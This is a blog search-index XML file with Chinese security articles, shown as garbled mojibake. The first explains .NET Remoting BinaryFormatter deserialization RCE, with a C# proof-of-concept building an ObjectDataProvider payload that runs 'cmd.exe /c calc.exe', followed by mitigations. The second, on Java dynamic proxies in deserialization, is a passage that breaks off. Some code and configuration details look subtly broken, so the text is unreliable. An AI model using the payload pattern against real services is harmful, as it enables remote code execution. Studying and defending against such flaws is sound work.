<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>.Net Remoting å¯¼è‡´çš„ååºåˆ—åŒ–æ¼æ´</title>
    <url>/archives/6e27d7b9.html</url>
    <content><![CDATA[<p><code>.NET Remoting</code> ååºåˆ—åŒ–æ¼æ´æ˜¯ä¸€ä¸ª<strong>ä¸¥é‡ä¸”å†å²æ‚ ä¹…çš„å®‰å…¨é—®é¢˜</strong>ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼ˆRCEï¼‰ï¼Œå°¤å…¶æ˜¯åœ¨æœªåŠ é˜²æŠ¤çš„ .NET Remoting æœåŠ¡æš´éœ²åœ¨å…¬ç½‘æˆ–ä¸å—ä¿¡ä»»ç½‘ç»œä¸­æ—¶ã€‚</p>
<hr>
<h2 id="ä¸€ã€ä»€ä¹ˆæ˜¯-NET-Remotingï¼Ÿ"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯-NET-Remotingï¼Ÿ" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯ .NET Remotingï¼Ÿ"></a>ä¸€ã€ä»€ä¹ˆæ˜¯ .NET Remotingï¼Ÿ</h2><p><code>.NET Remoting</code> æ˜¯å¾®è½¯åœ¨ .NET Framework 1.0 ~ 4.x æ—¶ä»£æä¾›çš„ä¸€ç§<strong>è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æŠ€æœ¯</strong>ï¼Œç”¨äºè·¨åº”ç”¨ç¨‹åºåŸŸï¼ˆAppDomainï¼‰ã€è¿›ç¨‹ç”šè‡³ç½‘ç»œè¿›è¡Œå¯¹è±¡é€šä¿¡ã€‚</p>
<ul>
<li>å®ƒå…è®¸ä¸€ä¸ªåº”ç”¨ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºåŸŸä¸­çš„å¯¹è±¡æ–¹æ³•ã€‚</li>
<li>ä½¿ç”¨ <strong>äºŒè¿›åˆ¶åºåˆ—åŒ–ï¼ˆBinaryFormatterï¼‰</strong> ä½œä¸ºé»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶ã€‚</li>
<li>å·²è¢« <strong>WCFï¼ˆWindows Communication Foundationï¼‰</strong> å’Œç°ä»£ APIï¼ˆå¦‚ gRPCã€ASP.NET Web APIï¼‰å–ä»£ã€‚</li>
<li><strong>è‡ª .NET 5 èµ·å·²å®Œå…¨å¼ƒç”¨</strong>ï¼Œä¸æ¨èåœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨ã€‚</li>
</ul>
<hr>
<h2 id="äºŒã€ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#äºŒã€ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="äºŒã€ååºåˆ—åŒ–æ¼æ´åŸç†"></a>äºŒã€ååºåˆ—åŒ–æ¼æ´åŸç†</h2><h3 id="æ ¸å¿ƒé—®é¢˜ï¼šBinaryFormatter-çš„ä¸å®‰å…¨æ€§"><a href="#æ ¸å¿ƒé—®é¢˜ï¼šBinaryFormatter-çš„ä¸å®‰å…¨æ€§" class="headerlink" title="æ ¸å¿ƒé—®é¢˜ï¼šBinaryFormatter çš„ä¸å®‰å…¨æ€§"></a>æ ¸å¿ƒé—®é¢˜ï¼š<code>BinaryFormatter</code> çš„ä¸å®‰å…¨æ€§</h3><p><code>.NET Remoting</code> é»˜è®¤ä½¿ç”¨ <code>System.Runtime.Serialization.Formatters.Binary.BinaryFormatter</code> è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
<blockquote>
<p>âš ï¸ <strong><code>BinaryFormatter</code> çš„è‡´å‘½ç¼ºé™·</strong>ï¼š</p>
<ul>
<li>å®ƒå¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–<strong>ä»»æ„ç±»å‹çš„å¯¹è±¡</strong>ï¼ŒåŒ…æ‹¬ <code>Delegate</code>ã€<code>Type</code>ã€<code>Assembly</code> ç­‰ã€‚</li>
<li>åœ¨ååºåˆ—åŒ–æ—¶ï¼Œä¼š<strong>è‡ªåŠ¨è°ƒç”¨å¯¹è±¡çš„æ„é€ å‡½æ•°ã€setterã€äº‹ä»¶å¤„ç†å™¨ç­‰</strong>ã€‚</li>
<li>æ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ– payloadï¼Œåˆ©ç”¨æŸäº›ç±»å‹ï¼ˆå¦‚ <code>TypeConfuseDelegate</code>ã€<code>ObjectDataProvider</code>ï¼‰åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘<strong>ä»»æ„ä»£ç æ‰§è¡Œ</strong>ã€‚</li>
<li>TypeLevel ä¸º Fullçš„æ—¶å€™æ‰ä¼šå¯¼è‡´æ¼æ´</li>
</ul>
</blockquote>
<hr>
<h3 id="æ¼æ´è§¦å‘æµç¨‹"><a href="#æ¼æ´è§¦å‘æµç¨‹" class="headerlink" title="æ¼æ´è§¦å‘æµç¨‹"></a>æ¼æ´è§¦å‘æµç¨‹</h3><ol>
<li>æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ˆpayloadï¼‰ï¼Œå…¶ä¸­åŒ…å«ï¼š<ul>
<li>æŒ‡å‘å±é™©ç±»å‹ï¼ˆå¦‚ <code>System.Windows.Data.ObjectDataProvider</code>ï¼‰çš„å¼•ç”¨ã€‚</li>
<li>è®¾ç½® <code>MethodName</code> ä¸º <code>Process.Start</code>ï¼Œ<code>MethodParameters</code> ä¸º <code>cmd.exe /c calc</code>ã€‚</li>
</ul>
</li>
<li>å°†è¯¥ payload å‘é€ç»™ä½¿ç”¨ <code>.NET Remoting</code> çš„æœåŠ¡ç«¯ã€‚</li>
<li>æœåŠ¡ç«¯è°ƒç”¨ <code>BinaryFormatter.Deserialize()</code> æ—¶ï¼Œè‡ªåŠ¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li>
<li>æ”»å‡»è€…è·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æƒé™ã€‚</li>
</ol>
<hr>
<h2 id="ä¸‰ã€ç»å…¸åˆ©ç”¨æ–¹å¼ï¼ˆPoC-ç¤ºä¾‹ï¼‰"><a href="#ä¸‰ã€ç»å…¸åˆ©ç”¨æ–¹å¼ï¼ˆPoC-ç¤ºä¾‹ï¼‰" class="headerlink" title="ä¸‰ã€ç»å…¸åˆ©ç”¨æ–¹å¼ï¼ˆPoC ç¤ºä¾‹ï¼‰"></a>ä¸‰ã€ç»å…¸åˆ©ç”¨æ–¹å¼ï¼ˆPoC ç¤ºä¾‹ï¼‰</h2><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ”»å‡»è€…æ„é€ çš„æ¶æ„å¯¹è±¡ï¼ˆç¤ºæ„ï¼‰</span></span><br><span class="line"><span class="keyword">var</span> dataProvider = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">dataProvider.ObjectType = <span class="keyword">typeof</span>(System.Diagnostics.Process);</span><br><span class="line">dataProvider.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">dataProvider.MethodParameters.Add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">dataProvider.MethodParameters.Add(<span class="string">&quot;/c calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–è¿™ä¸ªå¯¹è±¡</span></span><br><span class="line">IFormatter formatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line"><span class="keyword">using</span> (<span class="keyword">var</span> stream = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">&#123;</span><br><span class="line">    formatter.Serialize(stream, dataProvider); <span class="comment">// è¿™ä¸ª stream å°±æ˜¯æ¶æ„ payload</span></span><br><span class="line">    <span class="comment">// å‘é€ç»™ Remoting æœåŠ¡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“æœåŠ¡ç«¯ååºåˆ—åŒ–è¿™ä¸ªæµæ—¶ï¼Œ<code>calc.exe</code> ä¼šè¢«æ‰§è¡Œã€‚</p>
<hr>
<h2 id="å››ã€å—å½±å“çš„ç»„ä»¶"><a href="#å››ã€å—å½±å“çš„ç»„ä»¶" class="headerlink" title="å››ã€å—å½±å“çš„ç»„ä»¶"></a>å››ã€å—å½±å“çš„ç»„ä»¶</h2><table>
<thead>
<tr>
<th>ç»„ä»¶</th>
<th>æ˜¯å¦å—å½±å“</th>
</tr>
</thead>
<tbody><tr>
<td><code>.NET Remoting</code></td>
<td>âœ… é«˜å±ï¼ˆé»˜è®¤ä½¿ç”¨ <code>BinaryFormatter</code>ï¼‰</td>
</tr>
<tr>
<td><code>BinaryFormatter</code></td>
<td>âœ… æ‰€æœ‰ä½¿ç”¨å®ƒçš„åœºæ™¯éƒ½å¯èƒ½å—å½±å“</td>
</tr>
<tr>
<td><code>LosFormatter</code></td>
<td>âš ï¸ éƒ¨åˆ†åœºæ™¯å¯èƒ½å—å½±å“</td>
</tr>
<tr>
<td><code>NetDataContractSerializer</code></td>
<td>âš ï¸ å¦‚æœç±»å‹ä¸å—æ§ï¼Œä¹Ÿå¯èƒ½æœ‰é—®é¢˜</td>
</tr>
<tr>
<td><code>JSON.NET</code> (Newtonsoft.Json)</td>
<td>âš ï¸ å¦‚æœè®¾ç½® <code>TypeNameHandling = Auto/All</code>ï¼Œä¹Ÿå¯èƒ½ååºåˆ—åŒ–æ”»å‡»</td>
</tr>
<tr>
<td><code>XmlSerializer</code></td>
<td>âŒ ç›¸å¯¹å®‰å…¨ï¼ˆä¸æ”¯æŒä»»æ„å¯¹è±¡å›¾ï¼‰</td>
</tr>
</tbody></table>
<hr>
<h2 id="äº”ã€æ¼æ´å½±å“"><a href="#äº”ã€æ¼æ´å½±å“" class="headerlink" title="äº”ã€æ¼æ´å½±å“"></a>äº”ã€æ¼æ´å½±å“</h2><ul>
<li><strong>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</strong>ï¼šæ”»å‡»è€…å¯åœ¨æœåŠ¡å™¨ä¸Šä»¥è¿è¡Œ .NET æœåŠ¡çš„æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</li>
<li><strong>æƒé™æå‡</strong>ï¼šå¦‚æœæœåŠ¡ä»¥é«˜æƒé™è¿è¡Œï¼ˆå¦‚ LocalSystemï¼‰ï¼Œå¯å®Œå…¨æ§åˆ¶æœåŠ¡å™¨ã€‚</li>
<li><strong>æ¨ªå‘ç§»åŠ¨</strong>ï¼šä½œä¸ºå†…ç½‘æ¸—é€çš„è·³æ¿ã€‚</li>
<li><strong>æ•°æ®æ³„éœ²</strong>ï¼šè¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿæ–‡ä»¶ã€æ•°æ®åº“å‡­æ®ç­‰ã€‚</li>
</ul>
<hr>
<h2 id="å…­ã€ä¿®å¤ä¸ç¼“è§£æªæ–½"><a href="#å…­ã€ä¿®å¤ä¸ç¼“è§£æªæ–½" class="headerlink" title="å…­ã€ä¿®å¤ä¸ç¼“è§£æªæ–½"></a>å…­ã€ä¿®å¤ä¸ç¼“è§£æªæ–½</h2><h3 id="âœ…-1-ç¦ç”¨-BinaryFormatterï¼ˆæœ€æ ¹æœ¬ï¼‰"><a href="#âœ…-1-ç¦ç”¨-BinaryFormatterï¼ˆæœ€æ ¹æœ¬ï¼‰" class="headerlink" title="âœ… 1. ç¦ç”¨ BinaryFormatterï¼ˆæœ€æ ¹æœ¬ï¼‰"></a>âœ… 1. <strong>ç¦ç”¨ BinaryFormatterï¼ˆæœ€æ ¹æœ¬ï¼‰</strong></h3><p>ä» .NET 4.0 å¼€å§‹ï¼Œå¾®è½¯æä¾›äº†å¼€å…³æ¥ç¦ç”¨ <code>BinaryFormatter</code>ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">runtime</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">NetFx40_LegacySecurityPolicy</span> <span class="attr">enabled</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">allowBinaryFormatter</span> <span class="attr">remoting</span>=<span class="string">&quot;false&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">runtime</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ–åœ¨ä»£ç ä¸­ï¼š</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">AppContext.SetSwitch(<span class="string">&quot;System.Runtime.Serialization.EnableUnsafeBinaryFormatterSerialization&quot;</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è®¾ç½®åï¼Œ<code>BinaryFormatter.Serialize/Deserialize</code> ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p>
</blockquote>
<hr>
<h3 id="âœ…-2-è¿ç§»åˆ°ç°ä»£é€šä¿¡æŠ€æœ¯"><a href="#âœ…-2-è¿ç§»åˆ°ç°ä»£é€šä¿¡æŠ€æœ¯" class="headerlink" title="âœ… 2. è¿ç§»åˆ°ç°ä»£é€šä¿¡æŠ€æœ¯"></a>âœ… 2. <strong>è¿ç§»åˆ°ç°ä»£é€šä¿¡æŠ€æœ¯</strong></h3><ul>
<li><strong>WCF</strong>ï¼ˆæ›´å®‰å…¨ï¼Œæ”¯æŒå¤šç§ç»‘å®šå’Œå®‰å…¨ç­–ç•¥ï¼‰</li>
<li><strong>ASP.NET Core Web API</strong>ï¼ˆRESTful + JSONï¼‰</li>
<li><strong>gRPC</strong>ï¼ˆé«˜æ€§èƒ½ï¼Œæ”¯æŒå¼ºç±»å‹å¥‘çº¦ï¼‰</li>
<li><strong>SignalR</strong>ï¼ˆå®æ—¶é€šä¿¡ï¼‰</li>
</ul>
<p>é¿å…ä½¿ç”¨å·²è¿‡æ—¶çš„ <code>.NET Remoting</code>ã€‚</p>
<hr>
<h3 id="âœ…-3-æœ€å°æƒé™åŸåˆ™"><a href="#âœ…-3-æœ€å°æƒé™åŸåˆ™" class="headerlink" title="âœ… 3. æœ€å°æƒé™åŸåˆ™"></a>âœ… 3. <strong>æœ€å°æƒé™åŸåˆ™</strong></h3><ul>
<li>Remoting æœåŠ¡ä¸è¦ä»¥ <code>LocalSystem</code> æˆ–ç®¡ç†å‘˜æƒé™è¿è¡Œã€‚</li>
<li>ä½¿ç”¨ä½æƒé™è´¦æˆ·è¿è¡ŒæœåŠ¡ã€‚</li>
</ul>
<hr>
<h3 id="âœ…-4-ç½‘ç»œéš”ç¦»ä¸é˜²ç«å¢™"><a href="#âœ…-4-ç½‘ç»œéš”ç¦»ä¸é˜²ç«å¢™" class="headerlink" title="âœ… 4. ç½‘ç»œéš”ç¦»ä¸é˜²ç«å¢™"></a>âœ… 4. <strong>ç½‘ç»œéš”ç¦»ä¸é˜²ç«å¢™</strong></h3><ul>
<li>ä¸è¦å°† Remoting æœåŠ¡æš´éœ²åœ¨å…¬ç½‘ã€‚</li>
<li>ä½¿ç”¨é˜²ç«å¢™é™åˆ¶è®¿é—® IPã€‚</li>
<li>ä½¿ç”¨ TLS åŠ å¯†é€šä¿¡ï¼ˆè™½ç„¶åŠ å¯†ä¸èƒ½é˜²æ­¢ååºåˆ—åŒ–æ”»å‡»ï¼Œä½†å¯é˜²ä¸­é—´äººï¼‰ã€‚</li>
</ul>
<hr>
<h3 id="âœ…-5-è¾“å…¥éªŒè¯ä¸ååºåˆ—åŒ–æ§åˆ¶"><a href="#âœ…-5-è¾“å…¥éªŒè¯ä¸ååºåˆ—åŒ–æ§åˆ¶" class="headerlink" title="âœ… 5. è¾“å…¥éªŒè¯ä¸ååºåˆ—åŒ–æ§åˆ¶"></a>âœ… 5. <strong>è¾“å…¥éªŒè¯ä¸ååºåˆ—åŒ–æ§åˆ¶</strong></h3><p>å¦‚æœå¿…é¡»ä½¿ç”¨ <code>BinaryFormatter</code>ï¼š</p>
<ul>
<li>å®ç°è‡ªå®šä¹‰ <code>SerializationBinder</code>ï¼Œé™åˆ¶å¯ååºåˆ—åŒ–çš„ç±»å‹ï¼š</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SafeSerializationBinder</span> : <span class="title">SerializationBinder</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> Type <span class="title">BindToType</span>(<span class="params"><span class="built_in">string</span> assemblyName, <span class="built_in">string</span> typeName</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// åªå…è®¸ç‰¹å®šç¨‹åºé›†å’Œç±»å‹</span></span><br><span class="line">        <span class="keyword">if</span> (assemblyName.Contains(<span class="string">&quot;TrustedAssembly&quot;</span>) &amp;&amp; </span><br><span class="line">            (typeName == <span class="string">&quot;TrustedType1&quot;</span> || typeName == <span class="string">&quot;TrustedType2&quot;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Type.GetType(<span class="string">$&quot;<span class="subst">&#123;typeName&#125;</span>, <span class="subst">&#123;assemblyName&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// æ‹’ç»å…¶ä»–ç±»å‹</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨</span></span><br><span class="line">formatter.Binder = <span class="keyword">new</span> SafeSerializationBinder();</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="âœ…-6-å¯ç”¨æ—¥å¿—ä¸ç›‘æ§"><a href="#âœ…-6-å¯ç”¨æ—¥å¿—ä¸ç›‘æ§" class="headerlink" title="âœ… 6. å¯ç”¨æ—¥å¿—ä¸ç›‘æ§"></a>âœ… 6. <strong>å¯ç”¨æ—¥å¿—ä¸ç›‘æ§</strong></h3><ul>
<li>è®°å½•ååºåˆ—åŒ–å¼‚å¸¸ã€‚</li>
<li>ç›‘æ§å¼‚å¸¸è¿›ç¨‹å¯åŠ¨ï¼ˆå¦‚ <code>cmd.exe</code>, <code>powershell.exe</code> ä» .NET æœåŠ¡å¯åŠ¨ï¼‰ã€‚</li>
</ul>
<hr>
<h2 id="ä¸ƒã€æ£€æµ‹å·¥å…·"><a href="#ä¸ƒã€æ£€æµ‹å·¥å…·" class="headerlink" title="ä¸ƒã€æ£€æµ‹å·¥å…·"></a>ä¸ƒã€æ£€æµ‹å·¥å…·</h2><ul>
<li><strong>Microsoft BinaryFormatter Scanner</strong>ï¼šå®˜æ–¹å·¥å…·ï¼Œæ‰«æç¨‹åºé›†æ˜¯å¦ä½¿ç”¨ <code>BinaryFormatter</code>ã€‚</li>
<li><strong>Burp Suite &#x2F; ysoserial.net</strong>ï¼šç”¨äºç”Ÿæˆå’Œæµ‹è¯•ååºåˆ—åŒ– payloadã€‚</li>
<li><strong>Code Analysis Tools</strong>ï¼šå¦‚ SonarQubeã€ReSharper å¯æ£€æµ‹ä¸å®‰å…¨çš„åºåˆ—åŒ–ç”¨æ³•ã€‚</li>
</ul>
<hr>
<h2 id="å…«ã€æ€»ç»“"><a href="#å…«ã€æ€»ç»“" class="headerlink" title="å…«ã€æ€»ç»“"></a>å…«ã€æ€»ç»“</h2><table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>å»ºè®®</th>
</tr>
</thead>
<tbody><tr>
<td>æ˜¯å¦ä½¿ç”¨ <code>.NET Remoting</code>ï¼Ÿ</td>
<td>âŒ å¼ƒç”¨ï¼Œä¸è¦åœ¨æ–°é¡¹ç›®ä¸­ä½¿ç”¨</td>
</tr>
<tr>
<td>æ˜¯å¦ä½¿ç”¨ <code>BinaryFormatter</code>ï¼Ÿ</td>
<td>âŒ ç¦ç”¨æˆ–ä¸¥æ ¼é™åˆ¶</td>
</tr>
<tr>
<td>å¦‚ä½•ä¿®å¤ï¼Ÿ</td>
<td>è¿ç§»åˆ° WCF&#x2F;WebAPI&#x2F;gRPC + ç¦ç”¨ BinaryFormatter + ç½‘ç»œéš”ç¦»</td>
</tr>
<tr>
<td>æ˜¯å¦å½±å“ç°ä»£ .NETï¼Ÿ</td>
<td>âŒ .NET 5+ å·²ç§»é™¤ Remotingï¼Œä½† <code>BinaryFormatter</code> ä»å­˜åœ¨ï¼ˆéœ€æ‰‹åŠ¨ç¦ç”¨ï¼‰</td>
</tr>
</tbody></table>
<blockquote>
<p>ğŸ” <strong>å®‰å…¨å»ºè®®</strong>ï¼š<br><strong>æ°¸è¿œä¸è¦ååºåˆ—åŒ–æ¥è‡ªä¸å—ä¿¡ä»»æºçš„æ•°æ®</strong>ï¼Œå°¤å…¶æ˜¯åœ¨ä½¿ç”¨ <code>BinaryFormatter</code> æ—¶ã€‚</p>
</blockquote>
<p>å¦‚æœä½ ä»åœ¨ç»´æŠ¤ä½¿ç”¨ <code>.NET Remoting</code> çš„æ—§ç³»ç»Ÿï¼Œ<strong>å¼ºçƒˆå»ºè®®å°½å¿«è¿ç§»æˆ–è‡³å°‘ç¦ç”¨ <code>BinaryFormatter</code></strong>ï¼Œå¦åˆ™ç³»ç»Ÿå°†é•¿æœŸå¤„äºé«˜é£é™©ä¹‹ä¸­ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
      </categories>
      <tags>
        <tag>.Net Remoting</tag>
        <tag>ååºåˆ—åŒ–æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>åŠ¨æ€ä»£ç†åœ¨javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨</title>
    <url>/archives/42eb2c82.html</url>
    <content><![CDATA[<h1 id="åŠ¨æ€ä»£ç†åœ¨Javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨"><a href="#åŠ¨æ€ä»£ç†åœ¨Javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨" class="headerlink" title="åŠ¨æ€ä»£ç†åœ¨Javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨"></a>åŠ¨æ€ä»£ç†åœ¨Javaååºåˆ—åŒ–ä¸­çš„åº”ç”¨</h1><h2 id="åŠ¨æ€ä»£ç†ç®€ä»‹"><a href="#åŠ¨æ€ä»£ç†ç®€ä»‹" class="headerlink" title="åŠ¨æ€ä»£ç†ç®€ä»‹"></a>åŠ¨æ€ä»£ç†ç®€ä»‹</h2><p>ä½•ä¸ºä»£ç†ï¼Ÿåœ¨æ—¥å¸¸ç”Ÿæ´»ä¸­æˆ‘ä»¬æˆ–å¤šæˆ–å°‘éƒ½æ¥è§¦è¿‡æˆ¿äº§ä¸­ä»‹ã€4Såº—ä»¥åŠå„ç§å„æ ·çš„ä»£ç†å•†ï¼Œä»–ä»¬åœ¨ç»æµç¤¾ä¼šè¿è¡Œå½“ä¸­æ‰®æ¼”ç€ä»£ç†çš„è§’è‰²ï¼Œè´Ÿè´£å¯¹æ¥å‚å•†ä¸å®¢æˆ·ã€‚<br>ç”¨æˆ·å¦‚æœæƒ³è¦æŠ•è¯‰äº§å“ã€å¯»æ±‚èµ”å¿ç­‰ï¼Œå¯ä»¥ç»Ÿä¸€æ‰¾åˆ°ä»£ç†å•†ï¼Œç”±ä»£ç†å•†å‘å‚å•†æå‡ºï¼Œè¿™æ ·ä¾¿æå¤§çš„èŠ‚çº¦äº†ç”¨æˆ·çš„å„æ–¹é¢æˆæœ¬ã€‚<br>åœ¨ç¼–ç¨‹ä¸­æ‰€è°“çš„ä»£ç†æ¨¡å¼ä¹Ÿæ˜¯åŒæ ·çš„é“ç†ï¼Œå½“æˆ‘ä»¬æƒ³è¦å¯¹æŸä¸€ä¸ªç±»è¿›è¡ŒåŠŸèƒ½æ‰©å±•è€Œåˆä¸æƒ³ç›´æ¥ä¿®æ”¹å½“å‰ç±»çš„ä»£ç çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªä»£ç†ç±»æ¥å¯¹ç›®æ ‡ç±»è¿›è¡ŒåŒ…è£…ã€‚<br>é€šè¿‡åœ¨å½“å‰ç±»çš„è¿è¡Œå‰ã€è¿è¡Œåã€è¿è¡Œå¼‚å¸¸æ—¶æ·»åŠ æ–°çš„ä»£ç ä»è€Œå®ç°ç›®æ ‡ç±»åŠŸèƒ½çš„å¢å¼ºä¸æ‹“å±•ã€‚è¿™ä¾¿æ˜¯ä»£ç†æ¨¡å¼çš„è¿è¡Œã€‚å¦‚ä¸‹å›¾ï¼ŒAè¡¨ç¤ºè¢«ä»£ç†ç±»ï¼ŒBè¡¨ç¤ºä»£ç†ç±»ï¼Œå½“Aæ²¡æœ‰è¢«ä»£ç†æ—¶ï¼Œå¤–ç•Œçš„å…¶ä»–æ–¹æ³•å¯ä»¥ç›´æ¥è°ƒç”¨Açš„æ–¹æ³•ï¼Œ<br>å½“Aè¢«ä»£ç†åï¼ŒCçš„æ–¹æ³•å¦‚æœè¦æƒ³è°ƒç”¨Açš„æ–¹æ³•å°±éœ€è¦å…ˆé€šè¿‡Bç±»å†ç”±Bç±»è°ƒç”¨Aç±»çš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åœ¨Bç±»ä¸­å¢åŠ ä¸€äº›å…¶ä»–çš„åŠŸèƒ½ã€‚Bç±»æ­¤æ—¶å°±ç±»ä¼¼ä¸€ä¸ªæ”¶ä¿æŠ¤è´¹çš„ï¼Œè¦æƒ³ä»æ­¤è¿‡ï¼Œç•™ä¸‹ä¹°è·¯é’±ï¼Œæ­£æ‰€è°“æ¼«å¤©è¦ä»·ï¼Œååœ°è¿˜é’±ã€‚<br><img src="/archives/42eb2c82/003.png"><br>ä»£ç†æŒ‰ç…§ä»£ç†ç±»åˆ›å»ºçš„æ—¶é—´èŠ‚ç‚¹ä¸åŒåˆå¯åˆ†ä¸ºé™æ€ä»£ç†ä¸åŠ¨æ€ä»£ç†ï¼Œæ‰€è°“é™æ€ä»£ç†å³å¯¹æ¯ä¸€ä¸ªè¢«ä»£ç†ç±»å‡åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ä»£ç†ç±»ä»¥ä»£ç†å…¶åŠŸèƒ½å¹¶æŒ‰ç…§éœ€è¦è¿›è¡Œæ‰©å±•ï¼Œè¿™æ ·å°±é¢ä¸´ä¸€ä¸ªå›°å¢ƒï¼Œå³å¦‚æœæœ‰å¾ˆå¤šçš„éœ€è¦è¢«ä»£ç†çš„ç±»ï¼Œ<br> é‚£ä¹ˆå°±éœ€è¦æ‰‹åŠ¨åˆ›å»ºå¯¹åº”æ•°é‡çš„ä»£ç†ç±»ï¼Œè¿™æ— ç–‘å¢åŠ äº†å·¥ä½œé‡ä¸ç®¡ç†å¤æ‚åº¦ã€‚<br>å½“ç›®æ ‡ç±»é€æ¸åœ¨å¢å¤šæ—¶ï¼Œå¯¹åº”çš„ä»£ç†ç±»æ•°é‡éšä¹‹æ‰©å¼ ã€‚<br><img src="/archives/42eb2c82/004.png"><br> è€ŒåŠ¨æ€ä»£ç†åˆ™èƒ½å¾ˆå¥½åœ°å±è”½è¿™ä¸ªç¼ºé™·ï¼ŒåŠ¨æ€ä»£ç†é€šè¿‡ä»£ç†æ¥å£ç±»å®ç°äº†ä»£ç†ç±»çš„è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆï¼Œæ— è®ºå­˜åœ¨å¤šå°‘è¢«ä»£ç†ç±»ï¼Œ<br>åªè¦ä»–ä»¬å®ç°äº†ç›¸å…³çš„æ¥å£ä¾¿å¯ä»¥åŠ¨æ€åœ°è¿›è¡Œä»£ç†ç±»çš„ç”Ÿæˆã€‚<br>å½“ä½¿ç”¨åŠ¨æ€ä»£ç†æ—¶ï¼Œæ— è®ºç”±å¤šå°‘ä¸ªç›®æ ‡ç±»A B D â€¦ åªéœ€ä¿è¯ä»–ä»¬éƒ½å®ç°äº†ç»Ÿä¸€æ¥å£SAï¼Œåˆ™åªéœ€ä»£ç†SAæ¥å£ä¸€æ¬¡å³å¯å¯¹æ‰€æœ‰çš„ç›®æ ‡ç±»è¿›è¡Œç»Ÿä¸€çš„ç®¡ç†ã€‚<br><img src="/archives/42eb2c82/005.png"><br>åœ¨ <code>JAVA</code> ä¸­ï¼ŒåŠ¨æ€ä»£ç†çš„å®ç°ä¸»è¦ä¾èµ–äº <code>Proxy</code> ç±»ä»¥åŠç›¸åº”çš„ <code>InvocationHandler</code> å®ç°ï¼Œ<code>Proxy</code> ç±»è´Ÿè´£ä»£ç†ç±»çš„ç”Ÿæˆï¼Œ<code>InvocationHandler</code> æ¥å£è´Ÿè´£ç›®æ ‡æ–¹æ³•çš„åŠŸèƒ½æ‰©å±•ã€‚<br>åŠ¨æ€ä»£ç†å®ç°ç›®æ ‡ç±»åŠŸèƒ½æ‰©å±•çš„æ 